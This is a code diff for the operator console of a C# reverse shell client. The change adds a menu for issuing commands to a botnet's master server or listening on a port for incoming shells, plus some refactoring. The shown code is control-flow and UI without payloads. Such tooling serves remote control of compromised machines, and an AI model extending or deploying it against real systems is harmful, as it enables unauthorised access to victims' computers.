@@ -5,6 +5,7 @@ using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using AdvancedConsole;
+using ClientBotnet;
 using ClientCommands;
 using Shared;
 
@@ -26,52 +27,77 @@ namespace ReverseShellClient
         {
             networkManager = new ClientNetworkManager();
             commandsManager = new ClientCommandsManager(networkManager);
-            Console.ForegroundColor = ConsoleColor.Green;
+            ColorTools.SetDefaultConsoleColor();
         }
 
 
         /// <summary>
         /// Entry point of the client. Call methods to initiate port listening.
         /// When a remote computer connects to us, initiate the prompt loop and monitor the connection.
-        /// If the other end disconnects, this will ask if the program should listen again
         /// </summary>
         public void Start()
         {
-            DisplayTools.DisplayBanner();
+            ConsoleTools.DisplayBanner();
 
-            var listen = true;
-
-            while (listen)
+            var choice = "";
+            while (choice != "9")
             {
-                Console.Write(@"Please type a port number to listen to : ");
-                var port = 0;
-                while (port == 0)
+                Console.WriteLine("\n+---------------------------------------------------+");
+                Console.Write("Choose one option :\n\n    1 : Issue commands to the botnet's master server\n    2 : Listen on a port\n    9 : Exit\n\nChoice : ");
+
+                // Reset choice here or infinite loop
+                choice = "";
+                while (choice != "1" && choice != "2" && choice != "9")
                 {
-                    try
+                    choice = Console.ReadLine();
+                    // Space a bit
+                    Console.WriteLine("");
+
+                    int port;
+
+                    switch (choice)
                     {
-                        port = int.Parse(Console.ReadLine());
-                        if(port < 1 || port > 65535)
-                            throw new ArgumentException();
-                    }
-                    catch (Exception)
-                    {
-                        Console.Write("This is not a valid port, please type again\n>");
+                        case "1":
+                            port = BotnetManager.Process() ?? 0;
+                            if(port == 0) break;
+
+                            ListenForIncomingConnection(port);
+                            break;
+
+                        case "2":
+                            port = ConsoleTools.AskForPortNumber("Please type a port number to listen to");
+                            ListenForIncomingConnection(port);
+                            break;
+
+                        case "9":
+                            // exit
+                            break;
+
+                        default:
+                            Console.Write("Invalid choice, please type again\n> ");
+                            break;
                     }
                 }
-
-                // Listen and start connection
-                networkManager.ListenAndConnect(port);
-
-                // Check if the connection is still active in the background
-                var connectionMonitoringTask = new Task(MonitorConnection);
-                connectionMonitoringTask.Start();
-
-                // Process user input
-                RunClient();
-                
-                // Connection ended, ask listen again
-                listen = AskListenAgain();
             }
+        }
+
+
+        /// <summary>
+        /// Call the client network manager ListenAndConnect() method.
+        /// When the connection is established, call RunClient() in the current thread and MonitorConnection() in another thread
+        /// </summary>
+        /// <param name="port">Port number to listen to</param>
+        void ListenForIncomingConnection(int port)
+        {
+            // Listen and start connection
+            networkManager.ListenAndConnect(port);
+
+            // Check if the connection is still active in the background
+            var connectionMonitoringTask = new Task(MonitorConnection);
+            connectionMonitoringTask.Start();
+
+            // Process user input
+            RunClient();
         }
 
 
@@ -113,7 +139,7 @@ namespace ReverseShellClient
         /// </summary>
         void RunClient()
         {
-            DisplayTools.DisplayCommandPrompt();
+            ConsoleTools.DisplayCommandPrompt();
 
             while (true)
             {
@@ -159,7 +185,7 @@ namespace ReverseShellClient
                             // Display command's help
                             commandsManager.ShowCommandHelp(command);
 
-                            DisplayTools.DisplayCommandPrompt();
+                            ConsoleTools.DisplayCommandPrompt();
                             continue;
                         }
 
@@ -169,7 +195,7 @@ namespace ReverseShellClient
                             ColorTools.WriteCommandError(
                                 $"Syntax error, check out the command's help page ({commandName} help)");
 
-                            DisplayTools.DisplayCommandPrompt();
+                            ConsoleTools.DisplayCommandPrompt();
                             continue;
                         }
 
@@ -186,7 +212,7 @@ namespace ReverseShellClient
                         }
                         catch (ExitException)
                         {
-                            // The client called the 'Exit' or 'Terminate' command
+                            // The client called the 'Exit', 'StopConnection' or 'Terminate' command
                             Cleanup(isCommandProcessing: false);
                             break;
                         }
@@ -209,23 +235,8 @@ namespace ReverseShellClient
                     }
                 }
 
-                DisplayTools.DisplayCommandPrompt();
+                ConsoleTools.DisplayCommandPrompt();
             }
-        }
-
-
-        /// <summary>
-        /// Simple method to ask if the program should listen again on a port for an incomming connection
-        /// </summary>
-        /// <returns>User's choice</returns>
-        bool AskListenAgain()
-        {
-            // 'Yes' is the default choice
-            Console.Write("Listen again ? (Y/n) ");
-            var input = Console.ReadLine();
-            Console.Clear();
-
-            return input != "n" && input != "N";
         }
 
 
